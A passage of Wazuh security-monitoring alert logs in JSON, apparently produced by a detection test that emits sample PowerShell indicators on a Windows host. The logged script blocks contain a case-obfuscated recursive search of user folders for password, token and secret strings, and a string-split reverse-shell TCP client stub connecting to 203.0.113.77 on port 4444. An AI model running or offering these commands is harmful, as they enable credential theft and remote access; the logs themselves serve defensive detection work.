\"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:52.1906934Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:52.1906934Z\",\"eventRecordID\":\"723928\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-299'; $indicator='get-chiLdIteM -PATH ''C:\\\\uSerS'' -rECurse -inClUdE ''*.ConFig'',''*.xML'' | SELeCT-STrING -pATTERn ''PaSsWord|tokEn|sEcRET'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 148d35f5-f2e4-4466-9b96-b5f246b7a485\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-299'; $indicator='get-chiLdIteM -PATH ''C:\\\\\\\\uSerS'' -rECurse -inClUdE ''*.ConFig'',''*.xML'' | SELeCT-STrING -pATTERn ''PaSsWord|tokEn|sEcRET'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"148d35f5-f2e4-4466-9b96-b5f246b7a485\"}}}","id":"1784281072.607273","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script recursively collected files from a filesystem search","firedtimes":4,"groups":["windows"," powershell"],"id":"91820","level":4,"mail":false,"mitre":{"id":["T1083","T1119"],"tactic":["Discovery","Collection"],"technique":["File and Directory Discovery","Automated Collection"]}},"timestamp":"2026-07-17T11:37:52.341+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1fbac975-d49d-491f-88a9-92a315947fcd","scriptBlockText":"$sampleId='PST-300'; $indicator='$client=New-Object' + ' System.Net.Soc' + 'kets.TcpClient(''' + '203.0.113.77'',4444)' + '; $stream=$client' + '.GetStream(); $buffe' + 'r=New-Object byte[]' + ' 4096; $read=$s' + 'tream.Read($buf' + 'fer,0,$buffer.Length' + ')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723930","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-300'; $indicator='$client=New-Object' + ' System.Net.Soc' + 'kets.TcpClient(''' + '203.0.113.77'',4444)' + '; $stream=$client' + '.GetStream(); $buffe' + 'r=New-Object byte[]' + ' 4096; $read=$s' + 'tream.Read($buf' + 'fer,0,$buffer.Length' + ')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1fbac975-d49d-491f-88a9-92a315947fcd\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:52.5168606Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:52.5168606Z\",\"eventRecordID\":\"723930\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-300'; $indicator='$client=New-Object' + ' System.Net.Soc' + 'kets.TcpClient(''' + '203.0.113.77'',4444)' + '; $stream=$client' + '.GetStream(); $buffe' + 'r=New-Object byte[]' + ' 4096; $read=$s' + 'tream.Read($buf' + 'fer,0,$buffer.Length' + ')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1fbac975-d49d-491f-88a9-92a315947fcd\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-300'; $indicator='$client=New-Object' + ' System.Net.Soc' + 'kets.TcpClient(''' + '203.0.113.77'',4444)' + '; $stream=$client' + '.GetStream(); $buffe' + 'r=New-Object byte[]' + ' 4096; $read=$s' + 'tream.Read($buf' + 'fer,0,$buffer.Length' + ')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1fbac975-d49d-491f-88a9-92a315947fcd\"}}}","id":"1784281073.609697","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:53.336+0200"}
